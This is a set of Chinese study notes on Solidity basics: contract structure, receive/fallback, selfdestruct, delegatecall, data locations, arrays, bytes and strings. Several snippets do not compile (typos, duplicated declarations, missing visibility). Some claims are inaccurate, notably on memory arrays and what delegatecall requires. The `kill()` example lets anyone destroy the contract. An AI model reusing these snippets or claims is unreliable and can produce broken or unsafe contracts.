# Solidity



## 初识

### 区块链基础

+ 事务：要么将一件事做完，要么就一点没做，不能存在做一部分的情况。
+ 交易：交易可以看作一个地址发送到另外一个地址的消息，可以包含一个二进制数据和以太币
+ 地址：外部地址（由公私钥对控制）和合约地址（由地址一起存储的代码控制）
+ 区块：
+ 存储、内存、栈
  + 存储：每一个地址都有一个持久化的内存，存储是将 256 位字映射到 256 位字的键值存储区，合约只能读写存储区内属于自己的部分
  + 内存：合约会试图为每一次消息调用获取一块被重新擦拭干净的内存实例。内存中的数据在合约函数执行就会被销毁。内存中读的长度被限制为 256 位，而写的长度可以是 8 位或 256 位。
  + 栈：合约的**所有计算**都在一个被称为栈（stack）的区域执行，栈最大有 1024 个元素，每一个元素长度是 256 bit；所以调用深度被限制为 1024 ，对复杂的操作，推荐使用循环而不是递归。



### 合约注释

+ 单行注释： `//`

+ 多行注释：`/*  */`

  + ```go
    /**
     * 块注释，一般在块注释的行首 加上 * 和 空格，增加可读性
    */
    ```

+ NatSpec注释：`///`，作用：描述注释，为函数、返回变量等提供丰富的文档。在编写合约时，推荐使用`NatSpec`为所有开放接口进行完整的注释。



### 合约结构

+ SPDX版权声明：在合约首行必须有合约的版权声明，如：`//SPDX-License-Identifier:MIT`。

  + 注意：`MIT`是一种合约的版权声明，在实际工作中，应结合项目实际情况选择对应的版权声明。SPDX所有版权声明参考：[SPDX License List | Software Package Data Exchange (SPDX)](https://spdx.org/licenses/)

+ pragma solidity：在合约的第二行，一般用来声明solidity的版本。

  + ```solidity
    pragma solidity ^0.8.15  //表示 solidity的版本为：>=0.8.15 <0.9.0 ，推荐使用这种方式
    pragma solidity 0.8.15  //指定具体的版本
    pragma solidity >=0.4.0 <0.8.0 //指定大范围版本
    ```

+ contract关键字：`contract`声明当前代码块是一个完整的合约，==注意：**合约名的首字母一般以大写字母开头**==。

  + ```solidity
    //SPDX-License-Identifier:MIT
    pragma solidity ^0.8.19;
    contract Hello{  //Hello 为合约名，首字母大写，以驼峰命名方式
    
    }
    ```

  + **合约中的`this`代表合约对象本身**。

  + 合约的`type`属性：

    + `type(C).name`：获取合约名。`C`为合约名称
    + `type(C).creationCode`：获取包含创建合约字节码的内存字节数组，可用于内联汇编。
    + `type(C).runtimeCode`：获取合约运行时字节码的内存字节数组，可用于内联汇编。

  + 注意：**一个源文件中可以包含多个版本声明、多个导入声明和多个合约声明**。

+ `import`导入声明，从其他文件中导入需要的变量或者函数

  + 导入本地文件：`import "./ERC20.sol";`，其中`./`表示从当前目录下导入
  + 导入网络文件：`import "https://github.com/aaa/.../tools.sol";`
  + 导入本地NPM库：
    + `npm install @openzeppelin/contracts`
    + ``import "@openzeppelin/contracts/token/ERC721/ERC721.sol";`
  + 导入时引入别名
    + `import * as symbolName from "filename";`
    + `import "filename" as symbolName;`

+ 接口（interface）：类似go语言中的接口，包含函数

  + ```solidity
    interface AnimalEat{
    	function eat()external returns(string memory);
    }
    ```

+ 库合约（library）：库与合约类似，但它的目的是在一个指定的地址，且仅部署一次，然后通过EVM的特性来复用代码。

  + ```solidity
    library Set{
    	struct Data{mapping(uint=>bool)flags;}
    	function test(){
    	
    	}
    }
    ```



### 以太币单位

以太币单位之间换算是在数字后加上单位来实现的。常用单位：`wei`、`gwei`、`ether`，如果数字后面没有单位，默认为`wei`。

```solidity
1 ether == 1e18;
1 gwei == 1e9
```



### 接收ETH

+ `payable`：

  + 使用`payable`标记的**函数**可以用于发送和接收Eth。
  + 使用`payable`标记的**地址变量**，允许发送和接收Eth。

+ `fallback`函数，称为：回退函数，==执行合约不存在的方法或使用calldata转账时，回退函数就会被执行==。函数名前不用加`function`。**可以携带数据**

  + ```solidity
    fallback()external {  //第一种形式，不带payable，调用时不能携带以太币
    
    }
    
    fallback()external payable {  //第二种形式，带payable，调用时可以携带以太币
    
    }
    
    fallback(bytes calldata input) external payable returns(bytes memory output){
    	//注意：input 的值  相当于 msg.data
    	//注意：msg.data 可以通过abi.decode(msg.data[4:])
    }
    ```

+ `receive`函数，只负责接收以太币，==执行合约calldata转换会调用receive函数==，一个合约最多只有一个`recevive`和`fallback`函数。函数名前不能加`function`。**不能携带数据**

  + ```solidity
    receive()external payable{ //必须带payable，因为该函数专门用来接收以太币
    
    }
    ```

+ `receive`和`fallback`函数同时存在时：

  + ```solidity
    /**
    
        调用时发送了ETH
                |
    判断 msg.data 是否为空
              /     \
            是       否
    是否存在 receive   fallbak()
          /   \
        存在   不存在
        /        \
    receive()   fallbak()
    
     */
    ```



### 自毁合约

```solidity
contract Hello {
	
	function kill() external{
        selfdestruct(payable(msg.sender)); //自毁函数,销毁合约，并将合约中的以太币转到给定的地址
 	}
}
```

+ 销毁合约，会将合约变为无效，删除该地址中的字节码文件
+ 销毁合约，会将合约中的所有资金强制发送到目标地址。如果地址是合约地址，即使合约中没有`fallback`和`receive`也会发送过去。







## 数据



### 数据与变量

```solidity
uint256 u = 123;  //u 变量，123 数据
```

solidity是一种静态强类型的语言，**变量类型和需要赋值的数据类型必须匹配**，或者所赋值的数据可以隐式转换为变量类型。







### 值类型

值类型：值类型传值时会将值拷贝一份，修改不会对原来值产生影响

==**常见的值类型：Boolean、Interger、Fixed、定长字节数组（bytes1~bytes32）、Enum枚举、地址Address、合约类型、函数**==





#### Boolean类型

```solidity
//bool类型，支持的运算符
  
! 逻辑非
|| 逻辑或
&& 逻辑与
```

==**注意： && 和 || 为短路运算符，使用短路运算符可以节省gas**==





#### Interger类型

  **整型包括**：`int、uint、int8~int256、uint8~uint256`

 

**获取类型的最大值和最小值**：`type(T).min、type(T).max`，例如：`type(uint256).max`



**支持运算符**：

```solidity
+  -  *  /  %   +=  -=  *=   %  %=  ++  --  **(幂)
```





#### Interger 整数字面常量



**使用`_`增加整数字面常量的可读性**：如 `123_000`





两种特殊的情况：

+ 三元运算符：`(...?...:...)`
+ 数组下标访问：`(<array>[<index>])`
+ **如：`255+(true ? 1:0)`或`255+[1,2,3][0]`是在`uint8`类型中计算的，会溢出**。

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Interger{
    function f1() public pure returns(uint256 a){
        a = 255 + (true ? 1:0); //Interger.f1 errored: VM error: revert.
    }
    function f2() public pure returns(uint256 b){
        b = 255 + 1; //256
    }
    function f3() public pure returns(uint256 c){
        c = 255 + [1,2,3][0];  // Interger.f3 errored: VM error: revert
    }
}
```







#### Fixed 定长浮点型

`unfixedM×N`和`fixedM×N`中，`M`表示该类型占的位数，必须能整除8，即8到256位。`N`表示可用的小数位数，是从0到80之间的任意数。



#### BytesN定长字节数组

定长字节数组：`bytes1~bytes32`，值类型



**赋值：**

+ 十六进制字面常量，`bytes1 public a = 0x61`
+ 字符串字面常量，注：**字符串字面常量最终会被解释成十六进制字节形式**。`bytes1 public b = "a"`



**属性：**

+ `length`，返回字节个数，可以通过索引读取对应的索引的字节
+ `bytesN[index]`，索引访问，相当于通过下标访问某个字节，从0开始。==**注意：不可以修改，只能访问**==





#### 字符串字面常量及类型



**字符串字面常量可以隐式转换成`bytes1~bytes32`、`bytes`和`string`。**

==注意：字符串字面常量在赋值给`bytes1~bytes32`时会被解释成原始的字节形式。==





**转义字符：**

```solidity
\'  单引号
\"  双引号
\\  反斜杠
\<newline>  换行
\b  退格
\f  换页
\n  换行符
\r  回车
\t  标签tab
\v  垂直标签
\xNN  十六进制转义
\uNNN  unicode转义
```



**用空格分开的字符串：`"foo" "baar"`等效于`"foobar"`**  





#### Unicode字面常量

常规字符串字面常量只能包含ASCII，而Unicode编码可以包含任何有效的UTF-8序列。

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;
contract Test{
	string public a = unicode"你好，世界！";
}
```





#### 十六进制字面常量

+ 十六进制字面常量以关键字`hex`开头，后跟字符串，**字符串必须是十六进制的字符串**，如：`hex"001122FF"`
+ 用空格分开的十六进制字面常量：`hex"61"  hex"61"`等效于`hex"6161"`





#### Enum枚举

`enum`是一种用户自定义类型，枚举可用来创建由一定数量的“常量值”构成的自定义类型。主要用于限制某个事务的选择。

==枚举默认值是第一个成员，所以枚举类型至少需要一个成员==，枚举不能多于 256 个成员。枚举默认的类型为 `uint8`，当枚举数足够多时，它会自动变成 `uint16`..等变大。

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Interger{
   enum Status {
       None,  //0
       Pending,  //1
       Shiped,  //2
       Completed  //3
   }
   Status public status;

    // 设置索引值
    function set(Status _status) external {
        status = _status;
    }
     // 设置
    function ship() external {
        status = Status.Shiped;
    }
    
    
    function getLargestValue() public pure returns (Status) {
        return type(Status).max;
    }

    function getSmallestValue() public pure returns (Status) {
        return type(Status).min;
    }
}
```

**注意：枚举类型可以显示转换成整数，但是不能进行隐式转换**



**使用 `type(NameOfEnum).min` 和 `type(NameOfEnum).max` 你可以得到给定枚举的最小值和最大值。**



#### 自定义的值类型

用户定义值类型使用 `type UserType is DefaultType` 来定义。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// 使用用户定义的值类型表示 18 位小数、256 bit的浮点类型。
type UFixed256x18 is uint256;
```





#### 值类型-地址类型

地址分为外部地址和合约地址，每个地址都有**一块持久化内存区**称为存储。

**地址类型是值类型，用address表示地址，长度是20个字节，一般使用十六进制的地址格式。**



**地址字面常量**：`0xddaAd340b0f1Ef65169Ae5E41A8b10776a75482d`





##### **address、uint160、bytes20之间的转换：**

+ 可以通过显示转换，实现三个类型之间的转换

+  address 可以用 uint160 表示。
+ address 可以用连续的 40 个十六进制数字表示。
+ address 不允许任何算数操作
+ `address` 允许和 `uint160`、 `整型字面常量`、`bytes20` 及`合约类型`相互转换。





##### **两种形式的地址转换：**

+ 允许从`address payable`到`address`的隐式转换，而从`address`到`address payable`必须显示的通过`payable(<address>)`转换。
+ 只能将`address`和合约类型转换成`address payable`
+ **只能将能接收以太币的合约类型转换成`address payable`，即合约中必须包含`receive`或可支付的`fallback`函数**。
+ `payable(0)`是有效的，一个特殊写法



##### **地址属性：**

```solidity
addr.balance  //获取地址余额，单位wei

address(this).code  //获取合约地址上EVM字节码，查询任何只能合约的部署代码
注意:合约没有完全创建，也就是 constructor 没有完全执行完的时候，code 也是空。

address(this).codehash   //获取合约代码的Keccak-256哈希值（为bytes32）
注意， addr.codehash 比使用 keccak256(addr.code) 更便宜。
```





##### **地址方法：**

+ `address()`：将地址转换成地址类型，如：`address(this) //将合约对象转换成地址`
+ `payable()`：将普通地址转换为可支付地址，如：`payable(msg.sender)`
+ **`<address payable>.transfer(uint256 amount)`：将余额转到当前地址（合约地址转账**）
  + 地址必须是payable address
  + 会消耗固定2300gas。
  + 如果转账目标地址是合约，则目标合约内部的`receive/fallback`函数会随着`transfer`函数一起执行。
  + 如：`_to.transfer(200)`

+ **`<address payable>.send(uint256 amount)returns(bool)`：将余额转到当前地址，并返回交易成功状态**
  + 消耗固定2300gas
  + 交易执行失败会返回false，send更底层，transfer相对sender较安全。
  + 如：`bool success = _to.send(100)`





##### **call、delegatecall、staticcall函数**：

为了与不知道 ABI 的合约进行交互，Solidity 提供了函数 `call`/`delegatecall`/`staticcall` 直接控制编码。它们都带有一个 `bytes memory` 参数和返回执行**成功状态**（bool）和**数据**（bytes memory）。



函数 `abi.encode`，`abi.encodePacked`，`abi.encodeWithSelector` 和 `abi.encodeWithSignature` 可用于编码结构化数据。



###### call()

`<address>.call(bytes memory)returns(bool,bytes memory)`：低级call调用，返回交易成功状态和返回数据

+ 低级 `CALL` 调用：不需要 payable address, 普通地址即可
+ 返回两个参数，一个 `bool` 值代表成功或者失败，另外一个是可能存在的 `data`
+ 只有`call`函数支持转账，其他两种函数不支持转账
+ 三种函数都支持调节gas
+ 例如：`(bool success,)=_to.call{value:100,gas:2300}("data")`或`(bool success,bytes memory data)=_to.call{value:100}("data")`



```solidity
function transferTo(address _addr) external payable returns(bool success,bytes memory data){
        //可以通过call来转账
        (success,data) = _addr.call{value:100,gas:2300}(msg.data);
        return (success,data);
}
```







###### delegatecall() 委托调用

`<address>.delegatecall(bytes memory)returns(bool,bytes memory)`

委托调用是：**委托对方调用自己数据的**。类似授权转账，比如我部署一个 Bank 合约， 授权 ContractA 使用 Bank 地址内的资金，ContractA 只拥有控制权，但是没有拥有权。



`deletegatecall`目的是用来对合约升级，因为之前的合约代码一旦部署好，几乎很难修改，所以我们可以再创建一个合约，在新创建的合约中编写新的方法，可以通过delegatecall来调用新创建合约中的方法，来改自己合约中的变量数据。



```solidity
//SPDX-License-Identifier:MIT

contract A {
	uint private num;
	function setNum(uint _num)public{  
		num = _num + 1;
	}
	
	//在A合约中，通过delegatecall调用合约B中的方法来修改A合约中的状态变量
	function bSetNumDelegateCall(address _bAddress,uint _num)public{
		(bool res,) = _bAddress.delegatecall(abi.encodeWithSignature("setNum(uint256)",_num));
	}
}

contract B{
	uint private num;
	function setNum(uint _num)public{
		num = _num + 2;
	}
}

/*
	通过delegatecall，A合约可以调用B合约中的方法，来改变A合约中的数据。
	
	如：A合约调用bSetNumDelegateCall方法，_bAddress为B合约地址，_num为1000，此时B合约中的num不变，而A合约中的num为		1002
	
	注意：delegatecall一般用于合约升级，使用delegatecall调用新合约方法必须要保证变量名是相同的，否则会报错，所以最好不要更改     变量名。比如：合约B中num必须和合约A中的num保持一致
/*
```







###### staticcall() 静态调用

`<address>.staticcall(bytes memory)returns(bool,bytes memory)`，它与 call 基本相同，发送所有可用 gas，也可以自己调节 gas，**但如果被调用的函数以任何方式修改状态变量，都将回退**。



```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract A{

	uint8 public a;
	function echo()external returns(string memory){
		a=1;
		return "hello world";
	}
}

contract B{
	
	//在B合约中通过staticcall来调用A合约中的函数
	function aStaticCall(address _aAddress)public{
		(bool res,) = _aAddress.staticcall(abi.encodeWithSignature("echo()"));
	}
}

/*
	此时，调用合约B中的aStaticCall方法，由于调用该方法会导致A合约中的a变量的值发生变化，因此，该方法会执行失败。
*/
```

==注意：staticcall属于静态调用，即不能改变变量的值==







#### 值类型—合约类型

每一个合约定义都有自己的类型：

+ 可以隐式将合约转换为他们继承的合约
+ 合约可以显示转换为`address`类型
+ 合约可以转换为`address payalbe`类型
+ 可以使用`new`来创建合约实例
+ ==注意：合约和`address`的数据表示是相同的==
+ ==注意：合约不支持任何运算符==



##### 转账实例

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.19;

contract A{
	uint256 public a = 123;
	
	fallback()external{
	
	}
	
	receive()external payable{
	
	}
}

contract B{
	uint256 public b = 123;
}

contract C{
	A public a = new A(); //通过new关键字来创建合约实例对象
	B public b = new B();
	
	//transferA()会执行成功，因为A合约中包含了receive函数，故可以向A合约实例中转账
	function transferA()external payable returns(address,address){  
		payable(address(a)).transfer(msg.value);
		return (address(a),payable(address(a)));
	}
	
	//transferB()不能执行成功，因为B合约中没有包含receive函数
	function transferB()external payable returns(address,address){
		payable(address(b)).transfer(mag.value);
		return(address(b),payable(address(b)));
	}
	
	function getBalance(address ads_)external view returns(uint256){
		return ads_.balance;
	}
}
```

合约属性：

+ `type(C).name`：C表示合约，可以获得合约名
+ `type(C).creationCode`：
  + 获得包含创建合约字节码的内存字节数组
  + 该值和合约内使用`address(this).code`的结果一样
  + 它可以在内联汇编中构建自定义创建例程，尤其使用`create2`操作码
  + 不能在合约本身或派生的合约访问此属性，因为会引起循环引用。
+ `type(C).runtimeCode`：
  + 获得合约的运行时字节码的内存数组。这是通常由`C`的构造函数部署的代码
  + 如果`C`有一个使用内联汇编的构造函数，那么可能与实际部署的字节码不同
  + 还要注意库在部署时修改器运行时字节码以防范定期调用。与`.creationCode`有相同的限制，不能在合约本身或派生的合约访问此属性。
+ `address(this).code`：合约字节码的内存字节数组
+ `address(this).codehash`：合约字节码的keccak256 哈希值





##### 构造函数

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.19;

contract Test{
	address public owner;

	constructor(){
		owner = msg.sender;
	}
	function getCode()public view returns(bytes memory){
		return address(this).code;  //这也是一个合约地址的一个属性
	}
}

contract C{
	string public name = type(Test).name;
	
	bytes public creationCode = type(Test).creationCode;
	
	 // runtimeCode 不能获取 constructor 修改 immutable 变量的数据       ************
    // 比如 Test 里的owner 不能是 immutable 类型
    // "runtimeCode" is not available for contracts containing immutable variables.
    // 等于合约地址上的属性 address(this).code
	bytes public runtimeCode = type(Test).runtimeCode;
}
```

==注意：Solidity 在智能合约内部提供了一个构造函数声明，**它只在合约部署时调用一次**，用于初始化合约状态。**如果没有明确定义的构造函数，则编译器会创建默认构造函数。**==





### 引用类型

引用类型：引用类型进行值传递时，传递的是其指针，注意：引用类型进行传递时，可以为值传递，也可以为引用传递。

==注意：**引用类型的数据变量必须显示指定数据位置，不管是在函数内部，函数参数，还是函数外部都需要显示指定**。==



##### 数据存储位置

在合约中声明和使用的变量都有一个数据位置，合约变量的数据位置将会影响Gas消耗量。

solidity中提供了三种数据位置：

+ 存储storage：**状态变量**保存的位置，只要合约存在就一直存储
+ 内存memory：即数据在内存中，数据仅在声明周期内**（函数调用期间）有效**。**不能用于外部调用**。
+ 调用数据calldata：用来**保存函数参数的特殊数据位置，是一个==只读==的位置**。
  + 调用数据calldata是不可修改的、非持久化的函数参数存储区域，效果大多类似内存memory。
  + **主要用于外部函数的参数**，但也可以用于其他变量，**无论外部或内部函数都可以使用**。



###### storage

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.19;

contract DataLocation{
	//storage
	uint256 stateVariable = 1;
	uint256[] stateArray = [1,2,3];
}
```

storage 存储位置 存储永久数据，可以被合约中的所有函数访问。相比其他数据位置，存储区数据位置的成本较高。

**storage是永久存储在以太坊区块链中，更具体说，是存储在存储树(Merkle Patricia)中，形成状态信息的一部分**。一旦使用这个类型，数据永远存在。

==**重点:状态变量总是存储在存储区(storage)中,并且不能显式地标记状态变量的位置。**==



###### memory

内存位置是临时数据，比存储位置便宜。它只能在函数中访问。一旦函数执行完毕，它的内容就会被丢弃。

memory：**存储在内存中，即分配、即使用，越过作用域则不可访问，等待被回收**。

**注意：**

+ ==函数参数包含返回参数都存储在内存中==
+ ==**引用类型的局部变量，需要显示指定数据存储位置（storage/memory）**==
+ ==mapping和struct类型，不能在函数中动态创建，必须从状态变量中分配它们==。
+ ==内存中不能创建动态数组==。
+ **函数的输入参数和输出参数如果是数组，使用memory**
+ 引用类型的局部变量：指定storage和memory的区别：
  + `storage`修改引用数据：会修改状态变量
  + `memory`修改引用数据: 函数运行完后即消失，修改的值也不会储存在状态变量中

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract DataLocations {
    struct MyStruct {   //注意：在solidity中，结构体是引用类型
        string name;
        uint256 age;
    }
    mapping(address => MyStruct) public myStructs;

    function test1() external returns (MyStruct memory) {
        myStructs[msg.sender] = MyStruct({name: "Anbang1", age: 18});

        // storage 会修改状态变量
        MyStruct storage myStruct1 = myStructs[msg.sender]; // 此时，将myStruct1定义为storage
        myStruct1.age++;  //这里修改，会导致状态变量mapping中的值struct中的字段发生变化
        return myStruct1;
    }
}
```







###### calldata

calldata 是不可修改的非持久性数据位置，所有传递给函数的值，都存储在这里。此外，**`calldata` 是外部函数(external function)的参数的默认位置。**

外部函数(external function)的参数存储在 calldata 中。函数的返回值中也可以使用 calldata 数据位置的数组和结构，但是无法给其分配空间。

==注意：==

- **要点: calldata 只能用在函数的输入和输出参数中** ,通常用于引用类型的输入参数。
- **要点: calldata 用在输入参数中，比 memorg 更省 gas**
- **要点: calldata 的参数不允许修改，但是 memory 参数允许修改**



==注意：引用参数，可以使用 calldata和memory，可用于 external 、public、internal、private函数==





###### stack

堆栈是EVM维护的非持久化性数据。EVM使用堆栈数据位置在执行期间加载变量。堆栈位置最多由1024个级别的限制。





###### calldata和memory区别

+ 函数调用时，calldata可以隐式转换成memory
  + calldata参数可以隐式转换为memory
  + memory参数不可以隐式转换为calldata
+ calldata参数是不可修改的，而memory参数是可以修改的





#### 不同数据位置赋值规则

1. 将存储变量赋值给存储变量(同类型)
   - `值 类 型`: 创建一个新副本。
   - `引用类型`: 创建一个新副本。
2. 将内存变量赋值给存储变量
   - `值 类 型`: 创建一个新副本。
   - `引用类型`: 创建一个新副本。
3. 将存储变量赋值给 内存变量
   - `值 类 型`: 创建一个新副本。
   - `引用类型`: 创建一个新副本。
4. 将内存变量赋值给 内存变量 (同类型)
   - `值 类 型`: 创建一个新副本。
   - ==`引用类型`: 不会创建副本。(**重要**)==

==注意：**对于引用类型的局部变量，从一个内存变量复制到另一个内存变量不会创建副本，共享内存**。==





#### 数组array

数组是同类元素的有序集合。数组声明时可以固定大小，也可以动态调整长度。



##### 数组创建

==数组长度上分为固定长度数组`T[k]`和可变长度数组`T[]`，类型上分为一维数组和多维数组==



###### 定长数组和动态数组

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
	//定长数组
	
	//第一种方式：直接初始化赋值
	uint[2] public arr1 = [1,2];
	
	//第二种方式：先声明后通过在函数内赋值，定长数组在函数内不能使用push方法
	uint[2] public arr2;
	
	function test()external{
		arr2[0] = 100;
		arr2[1] = 200;
	}
	
	
	//动态数组，只能在函数外创建动态数组，函数内不能创建动态数组
	
	//第一种方式：初始化赋值
	uint256[] public arr3 = [1,2,3];
	
	//第二种方式，先声明后赋值，只能通过在函数内用push方法赋值，而不能用= 赋值
	uint256[] public arr4;
	
	function test1(){
		arr4.push(1);
		arr4.push(2);
	
	}
	
}
```





###### 内存中创建数组

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract C {
    function f() public pure {
    
    	//内存中创建数组，即函数内创建数组
    	
    	//注意：函数内只能创建定长数组
    	
    	//第一种方式：初始化赋值
    	
    	uint256[2] memory arr1 = [uint256(1),2] //因为：在函数内部，数组[1,2],数组中的1，2都是uint8类型，需要强制转换
    
    	//第二种方式：先声明后赋值，定长数组只能通过=赋值
    	uint256[] memory arr2 = new uint256[](2);
    	arr2[0] =1;
        arr2[1] =2;
        
    }
}
```

**注意：**

+ **内存中不能创建动态数组，必须创建定长数组**
+ **内存中的定长数组不能使用`push`方法**
+ **内存中的定长数组只能通过索引进行赋值**



###### 动态数组和定长数组的gas区别

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract FunctionOutputs {
    // 26086 gas
    uint256[] public nums = [1, 2, 3];

    // 23913 gas
    uint256[3] public numsFixed = [1, 2, 3];
}
```

**注意：使用定长数组会消耗更少的gas，故能使用定长数组就使用定长数组，尽量少使用动态数组。**



###### 二维数组

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    // length:3   T.length为3
    uint256[2][3] public T = [[1, 2], [3, 4], [5, 6]];  //注意：声明方式，第一个数字为二维，第二个数字是一维


	//动态数组，uint[][5]
	uint256[][2] public T = [[1,2,3],[4,5,6]]; //注意：这里要特别小心，第二个数字是一维
    
	
	
    function getLength() external view returns (uint256) {
        return T.length;
    }
}
```

==注意：针对二维数组，定长数组和动态数组声明时要特别小心。==





##### 访问和修改数组

+ 通过索引访问数组的元素
+ 通过索引修改数组的元素
+ 注意：索引从0开始，到 `arr.length-1`



##### 函数中返回整个数组

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract FunctionOutputs {
    uint256[] public nums1 = [1, 2, 3];
    uint256[3] public nums2 = [1, 2, 3];


    //只能通过函数返回整个数组
    function test1() external view returns (uint256[] memory) {
        return nums1;
    }

    function test2() external view returns (uint256[3] memory) {
        return nums2;
    }
}
```

**注意：唯一方式可以获得整个数组数据是通过函数方式进行返回。**



##### 数组常量

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract T {
    function s(uint256[2] memory _arr) public {}

    function t() public {
        // Invalid type for argument in function call.
        // Invalid implicit conversion from uint8[2] memory to uint256[2] memory requested.
        // s([1, 2]); // 默认这么写不行的 ❌
        
        
        
        //原因：[1,2]默认是uint8[2] memory  ，因为每一个常量的类型都是uint8
        s([uint256(1), uint256(2)]); // ✅
    }
}
```

==**数组常量的惰性：在局部变量中，数组中的元素默认是uint8**==



##### 数组属性

+ `arr.length`：获取数组的长度
+ 不能通过设置`arr.length`来调整动态数组的长度





##### 数组方法

+ `push`：**只能用于动态数组，动态的storage数组和`bytes`类型，`string`类型不可用**
+ `pop`：删除数组的最后一个元素，只能用于storage数组
+ `delete`：**删除对应的索引；删除并不会改变长度，索引位置的值会改为默认值。**
+ `x[start:end]`：数组切片，**仅可使用于动态calldata 数组**，前包含后不包含

```solidity
//push 、pop、delete 示例
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Test{


	//push  只能用于   storage中的   动态数组和bytes类型 ，string类型不能用

	//pop  只能用于   storage中的   动态数组和bytes类型，string类型不能用， 删除数组最后一个元素
	
	
	//delete 既可以用于动态数组也可以用于定长数组
	//delete arr[0];  这回将arr[0]的值置为默认值0
	//delete arr;     这回将arr 数组中的所有元素都置为默认值0
	
	
	
	//数组切片，只能用于    动态的calldata数组和bytes数组  ，arr[start,end]前包含后不包含，arr[:] 表示全切
	//数组切片相当于只用函数内部，因为函数输入参数才有可能为calldata
	function f(uint256[] calldata arr)external {
        arr[:];
    }

}
```







#### bytes

`string`和`bytes`类型的变量是特殊的数组。**`bytes`可以通过索引或者`.length`来访问数据。`string`和`bytes`相同，但不允许用`.length`或索引来访问数据。**

+ 对任意长度的原始字节数据使用bytes，对任意长度字符串（UTF-8）数据使用string。
+ 如果使用一个长度限制的字节数组，应该使用一个`bytes1~bytes32`的具体类型，因为更便宜。
+ `bytesN[]`和`bytes`可以转换：bytes1是值类型，比如`0x61`；`bytes`是可变字节数组，如果bytes1想要借用bytes的方法，就需要将其转换成bytes。
+ 基本规则:对任意长度的原始字节数据使用 `bytes`，对任意长度字符串（UTF-8）数据使用 `string` 。



##### 创建

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
	
	
	//可变数组bytes创建方式：
	
	//第一种方式，相当于初始化赋值，直接将字符串显示转换成bytes
    bytes public welcome = bytes("1.Welcome");
    
    
    //第二种方式，指定bytes长度为2， 相当于定长数组bytes2
    bytes public temp1 = new bytes(2); // 可变字节数组创建方式

	function f1() external {
        temp1[0]="a";
        temp1[1]="b";
       
    }


	function f1() external {  //该函数会报错，因为bytes长度为2
        temp1[0]="a";
        temp1[1]="b";
        temp1[2]="c";
       
    }


	
	//第三种方式，通过函数参数，来实现变长bytes数组
	
    function test1(uint256 len_) public pure  returns(bytes memory){
    	
    	//函数中可变字节数组创建方式
        bytes memory temp2 = new bytes(len_);
        
         
        temp2[0] = "a";
        return temp2;
    }
    function test2() public{
        temp1[0] = "a";
    }
}
```



##### 属性

+ 获取bytes长度，`bytesVar.length`
+ 获取指定索引的数据，`bytes temp = bytes("hello,world")[0]`
+ 修改bytes，`bytesVar[0]='h'`



##### 方法

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{

	bytes public welcome = bytes("a");
	//bytes.concat 函数可以连接任意数量的 bytes 或 bytes1 … bytes32 值。
    bytes public concatBytes = bytes.concat(welcome, bytes("b"), bytes1("c"),"a");
    
    bytes public concatBytes = bytes.concat(); //不使用参数调用 bytes.concat 将返回空数组
    
    //----------------------------------------------------------------------------------
    
    
    bytes public welcome1 = bytes("Welcome");
    bytes public welcome2 = new bytes(10);

    function testPush() public {
        welcome1.push(bytes("A")[0]);  //push 是单个字节，是 bytes1的固定长度,而不是 bytes，只能用于storage。
        welcome2.push(bytes("B")[0]);
    }
    
    
    //-------------------------------------------------------------------------------------
    
    bytes public welcome1 = bytes("Welcome");
    bytes public welcome2 = new bytes(10);

    function testPop() public {
        welcome1.pop();  // pop 删除数组的最后一个元素，只能用于storage变量。
        welcome2.pop();
    }
    
    
    //--------------------------------------------------------------------------------------
    bytes public welcome1 = bytes("Welcome");

    function deleteAll() public {
        delete welcome1;  //delete 清空整个字节数组，全部置为默认值
    }

    function deleteIndex(uint256 index_) public {
        delete welcome1[index_];   //delete 清空某个索引对应的值，将该值置为默认值
    }
    
    
    //-------------------------------------------------------------------------------------
    bytes public welcome1 = bytes("Welcome");
    bytes4 public temp1 = bytes4(welcome1); // 0x57656c63

    // 把 welcome1 的值传入参数
    function forward(bytes calldata payload)
        external pure
        returns(bytes memory temp2,bytes4 temp3)
    {
        // 切片方法只能用在 calldata 上。 ******* 
        temp2 = payload[:4];
        temp3 = bytes4(payload[:4]);
    }
}
```



##### 字符串到bytes转换

```solidity
bytes public w = bytes("hello,world");
```





##### bytes到字符串转换

注意：字节数组分为动态大小和固定大小，如果是固定大小字节数组，需要先将其转换为动态大小数组，最后才能转换到字符串。

```solidity
string public str = string(bytes("hello,world"));

bytes1 public b = 0x61; 
string public str2 = string(bytes(b)); //将固定长度转换为动态，再转换成字符串
```





##### 比较两个bytes值是否相等

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Demo {
    bytes welcome1 = bytes("Welcome");
    bytes welcome2 = bytes("Welcome");

    function test1() public view returns (bool) {
        return keccak256(welcome2) == keccak256(welcome1);  //是通过哈希值来进行判断
    }
}
```







#### string

`string` 和 `bytes` 类型的变量是特殊的数组，是引用类型。



##### 属性

**string 并没有获取其字符串长度的 length 属性; 也没提供获取某个索引字节码的索引属性。**

我们可以通过把 string 转换成 `bytes`，借助`bytes` 的属性。



##### 方法

Solidity string 本身并没有操作函数，需要借助全局的函数

- 字符串拼接
  - `string.concat()`
  - 如果不使用参数调用 string.concat 将返回空数组。
- 将 bytes 转换到 字符串
  - `string()`
- 将 字符串 转换到 bytes
  - `bytes()`
- 比较两个字符串
